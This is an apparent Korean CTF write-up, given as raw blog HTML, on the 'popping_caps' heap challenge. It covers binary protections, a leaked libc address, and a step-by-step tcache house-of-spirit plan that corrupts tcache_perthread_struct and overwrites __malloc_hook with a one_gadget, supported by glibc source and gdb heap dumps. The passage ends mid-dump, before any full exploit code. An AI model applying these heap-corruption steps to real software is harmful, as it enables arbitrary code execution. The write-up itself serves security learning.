0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ checksec \nCANARY    <span class=\"token operator\">:</span> ENABLED\nFORTIFY   <span class=\"token operator\">:</span> disabled\nNX        <span class=\"token operator\">:</span> ENABLED\nPIE       <span class=\"token operator\">:</span> ENABLED\nRELRO     <span class=\"token operator\">:</span> disabled</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>popping_caps<span class=\"token operator\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared object\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">3.2</span><span class=\"token punctuation\">.</span><span class=\"token number\">0</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>b94b47318011a2516372524e7aaa0caeda06c79<span class=\"token punctuation\">,</span> <span class=\"token operator\">not</span> stripped</code></pre></div>\n<h2 id=\"바이너리-실행-결과\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\" aria-label=\"바이너리 실행 결과 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 실행 결과</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">Here is system <span class=\"token number\">0x7fb836b4c4e0</span>\nYou have <span class=\"token number\">7</span> caps<span class=\"token operator\">!</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> Malloc\n<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> Free\n<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> Write\n<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> Bye\nYour choice<span class=\"token operator\">:</span></code></pre></div>\n<ul>\n<li>lib_system 주소가 노출되는 것을 확인할 수 있으며 4개의 옵션으로 해제 , 할당, 입력, 종료가 가능하다.</li>\n</ul>\n<h2 id=\"취약한-부분\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B6%80%EB%B6%84\" aria-label=\"취약한 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약한 부분</h2>\n<h3 id=\"메모리-주소-노출\" style=\"position:relative;\"><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\" aria-label=\"메모리 주소 노출 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>메모리 주소 노출</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 576px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7ElEQVQoz5WPy2rEMAxF8/9f1+liCG3BTRlPYlt+xrKdh60SpswyTC9aXIEOB3UAqHVyriiFUkYpkxARAJVCYzJAsjY/utYJAENYhIg5b0TUjWPoewBAxqwQMYRaCr2YTql0varbzQNsWu/rWmul1o55ltaO02d/rAfMuRsGPU2R86TU6j15T85RzoR48Gdm79GYYExK6WC8p3kma6jkP9sZ7BxNYxvHBtC8WzBuRudS9pd+Zowul/3tPX98le8fNXDoPydnMy1Ul3MxdcYQY+kGEjd02ckobbYxLrtsq9vrKd4h0p3PUib6f34BCMMLTcuqYrcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/aa9a11af4119581246cb38067aa789bc/533c1/0.png\"\n        srcset=\"/static/aa9a11af4119581246cb38067aa789bc/e9ff0/0.png 180w,\n/static/aa9a11af4119581246cb38067aa789bc/f21e7/0.png 360w,\n/static/aa9a11af4119581246cb38067aa789bc/533c1/0.png 576w\"\n        sizes=\"(max-width: 576px) 100vw, 576px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>lib_system 주소를 노출시키는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"main-함수-부분\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\" aria-label=\"main 함수 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 부분</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAACCklEQVQoz3WS124bMRBF9f/flmcjlqK2xex92WZZAsoxYMnIAR8IkId3MJwDxd5eWEAyhthbr6XWWr4TQnAPrLXGGGut974/OJjJit/s48/phm5EU64559q5zT8IISCELpfL9XZFGBFChBCEkFrrkKXop4ldzJFb01orrQCM9Pag1rptm7XWORdCyDmnlEIIrbUhC96Pd3mkZyJl2SvBmBCCEFrXlVFqjHHO9f9wiKkItWOR4r7nuhPGhBRCCi6EUkppbb/k9uV8xg45q0iuCr9dyZGK9zkJwwkN2ljCNKYaEy8UGAfGtb28JoPy/I3xX5M7ocQ0cO2E7CGr+YMhxFZE5hVPi0KkuvAqhy07uSUL3sZc9yh1znnUlqAn6HnvGf7ta/uRDFXbKr33EEtv41LIPSTg2lLhuHRceqm90p6K8dZ3uWUQJ03PWE5I3Yg3NqbUe/eYrecLW1aJCJ3XbB0oO55+Ss5F4C25vAcoCSBnrfXoZ+29tLH2MhaUBntvT5UfMpQQW63jJz6P9INpmed1WdeVUIowpoxRzkKMT7L3O+NBOGO2rZYxdLXWlNL9fp/neVkXSqmUoyfW2hCeGn6oPsuTwO8Ev3N3l56rEOO2bUop80BrbYyRUqZHL57kFBoT1mymQi9QdoBSSoxxmqZlWRBC8zx/TisAvMqclwR7aa/T037wc7b/Av+0l13cdt0JAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/be58146616ae16fc7512e936779b14b9/37523/1.png\"\n        srcset=\"/static/be58146616ae16fc7512e936779b14b9/e9ff0/1.png 180w,\n/static/be58146616ae16fc7512e936779b14b9/f21e7/1.png 360w,\n/static/be58146616ae16fc7512e936779b14b9/37523/1.png 720w,\n/static/be58146616ae16fc7512e936779b14b9/ea7fb/1.png 788w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"bye-함수-부분\" style=\"position:relative;\"><a href=\"#bye-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\" aria-label=\"bye 함수 부분 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bye 함수 부분</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 641px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAx0lEQVQY042OwU7EMAxE+//fhcSNAwckDkgsauokjWPHcdIu2WYRiF2tKqFljp55nhnc9LhwEcbKUvJyPJ5q7aq9936+p+HwtL48hPfnt/A6zR92Aq/5pNq37R9w1FaXbbv0iEhrbRf6a8WwtH61VdUYgxGJKMZIREzMxCLCzKWU3aOhfvZz/z2llIwxAYO1FgAw4mjG0YwxxnVdRWQP3zaLCACABUR0znnvnXOImCTVWnPOd2BrbfiR826e528yJVUlIlXdwV/H/ZUqoDGwDQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/0307905eb1aa7e424b948b07f94c2d3f/c7dcc/2.png\"\n        srcset=\"/static/0307905eb1aa7e424b948b07f94c2d3f/e9ff0/2.png 180w,\n/static/0307905eb1aa7e424b948b07f94c2d3f/f21e7/2.png 360w,\n/static/0307905eb1aa7e424b948b07f94c2d3f/c7dcc/2.png 641w\"\n        sizes=\"(max-width: 641px) 100vw, 641px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"exploit-idea\" style=\"position:relative;\"><a href=\"#exploit-idea\" aria-label=\"exploit idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Idea</h2>\n<ul>\n<li>라이브러리 주소가 노출이되어 있기 때문에 해당 바이너리가 7가지 작업 만 수행 할 수 있으므로 작업을 낭비할 필요가 없다.</li>\n<li>라이브러리 버전은 2.27 버전이며 tcache를 사용하고 있다.</li>\n<li>바이너리 분석 결과 UAF를 직접적으로 가능하지 않기 때문에 tcache poisoning이 불가능 하다.</li>\n<li>우리는 Double free buf를 바탕으로 tcache dup을 사용할 수 있다.</li>\n<li>힙의 어느 위치에서나 해제가 가능하므로 tcache house of spirit을 사용할 수 있다.</li>\n<li>security check로 인해 작성하려는 위치에 fake chunk을 만들어야 한다.</li>\n<li>house of spirit을 사용하여 <code class=\"language-text\">tcache_perthread_structs</code> 항목을 손상시키는 것이 방법이다.</li>\n</ul>\n<h2 id=\"exploit-scenario\" style=\"position:relative;\"><a href=\"#exploit-scenario\" aria-label=\"exploit scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Scenario</h2>\n<ol>\n<li>0x3a8 사이즈 동적 할당</li>\n<li>tcahcebin (0x100) → 0x3a8 사이즈의 힙 해제후 tcache count 증가 로 인해 0x100 크기의 fake chunk의 size를 생성</li>\n<li>-0x210 (House of Spirit)의 Integer issue를 사용하여 fake chunk를 해제한다.</li>\n<li>크기가 0xf8인 malloc은 첫 번째 tcache 항목 (size 0x20)에 포인터를 반환한다.</li>\n<li>__malloc_hook의 포인터로 첫 번째 항목을 편집한다.</li>\n<li>size 0x20인 malloc 에서 반환된 포인터는 __malloc_hook이 된다.</li>\n<li>one_gadget으로 __malloc_hook에 overwrite 한다.</li>\n</ol>\n<h2 id=\"tcache_perthread_struct\" style=\"position:relative;\"><a href=\"#tcache_perthread_struct\" aria-label=\"tcache_perthread_struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>tcache_perthread_struct</h2>\n<ul>\n<li><code class=\"language-text\">_int_malloc</code> 을 통해 <code class=\"language-text\">tcache_perthread_struct</code>가 할당되어 힙에 상주한다.</li>\n<li>counts 멤버를 손상 시킨다면 tcache poisoning이 수행하는 작업을 더 적은 단계로 수 행 할 수 있다.</li>\n<li><code class=\"language-text\">tcache_perthread_struct</code> 는 single tcache thread의 body이며 두 개의 배열로 구성된다.</li>\n<li>그 중에서 데이터 항목은 <code class=\"language-text\">tcache entries</code>, <code class=\"language-text\">TCACHE_MAX_BIN 총 개수(default 64개)</code> , <code class=\"language-text\">tcache counts</code> 배열은 각 single linked list의 메모리 블록 수를 나타낸다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> counts<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  tcache_entry <span class=\"token operator\">*</span>entries<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> tcache_perthread_struct<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>struct의 single linked list의 최대 개수는 64개이며 single linked list에는 최대 7개의 메모리 블록이 있다.</li>\n<li>수용할 수 있는 최대 메모리 블록 크기는 0x408($1032_(10)$) 이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span>\n<span class=\"token comment\">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_MAX_BINS</span>\t\t<span class=\"token expression\"><span class=\"token number\">64</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MAX_TCACHE_SIZE</span>\t<span class=\"token expression\"><span class=\"token function\">tidx2usize</span> <span class=\"token punctuation\">(</span>TCACHE_MAX_BINS<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* Only used to pre-fill the tunables.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">tidx2usize</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span> idx<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> MALLOC_ALIGNMENT <span class=\"token operator\">+</span> MINSIZE <span class=\"token operator\">-</span> SIZE_SZ<span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* When \"x\" is from chunksize().  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">csize2tidx</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> MINSIZE <span class=\"token operator\">+</span> MALLOC_ALIGNMENT <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> MALLOC_ALIGNMENT<span class=\"token punctuation\">)</span></span></span>\n<span class=\"token comment\">/* When \"x\" is a user-provided size.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">usize2tidx</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span><span class=\"token function\">request2size</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">/* With rounding and alignment, the bins are...\n   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)\n   idx 1   bytes 25..40 or 13..20\n   idx 2   bytes 41..56 or 21..28\n   etc.  */</span>\n\n<span class=\"token comment\">/* This is another arbitrary limit, which tunables can change.  Each\n   tcache bin will hold at most this number of chunks.  */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_FILL_COUNT</span> <span class=\"token expression\"><span class=\"token number\">7</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></code></pre></div>\n<h2 id=\"heap-순서-파악\" style=\"position:relative;\"><a href=\"#heap-%EC%88%9C%EC%84%9C-%ED%8C%8C%EC%95%85\" aria-label=\"heap 순서 파악 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>heap 순서 파악</h2>\n<ul>\n<li>tcache_perthread_struct를 조작하기 위해서는 힙 순서를 파악해야 한다.</li>\n<li>힙은 첫 번째 할당에서만 시작되므로 할당하고 분석</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAZ0lEQVQY05XO2w2AIBBEUSpBDQqIPGQVV1YxMbH/mvywAUzm92QuewiuAyMVE90UJBe66WvH7JENUQdJzgGSVFbXe4b76fPNzdpo34+qk3+eETBEcluyi+NC/ctGDwWLmVM7jPXswy+njC1+PIP2+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/9b074550c9f4bafc691c35d4ba361b50/37523/3.png\"\n        srcset=\"/static/9b074550c9f4bafc691c35d4ba361b50/e9ff0/3.png 180w,\n/static/9b074550c9f4bafc691c35d4ba361b50/f21e7/3.png 360w,\n/static/9b074550c9f4bafc691c35d4ba361b50/37523/3.png 720w,\n/static/9b074550c9f4bafc691c35d4ba361b50/bf433/3.png 971w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>첫 번째 힙은 항상 tcache_perthread_struct 이다.</li>\n<li>두 번째 힙 청크는 0x3a8 크기</li>\n<li>마지막은 탑 청크로 분석된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x5577632b8000</span>\n$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  counts <span class=\"token operator\">=</span> <span class=\"token string\">\"\\000\\000\\000\\000\\000\\000\\000\\000Q\\002\"</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">53</span> times<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  entries <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">57</span> times<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5577632b8260</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\ngdb<span class=\"token operator\">-</span>peda$ x<span class=\"token operator\">/</span><span class=\"token number\">40</span>gx <span class=\"token number\">0x5577632b8000</span>\n<span class=\"token number\">0x5577632b8000</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000251</span>\n<span class=\"token number\">0x5577632b8010</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8020</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8030</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8040</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000100</span>\n<span class=\"token number\">0x5577632b8050</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8060</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8070</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8080</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8090</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80a0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80b0</span><span class=\"token 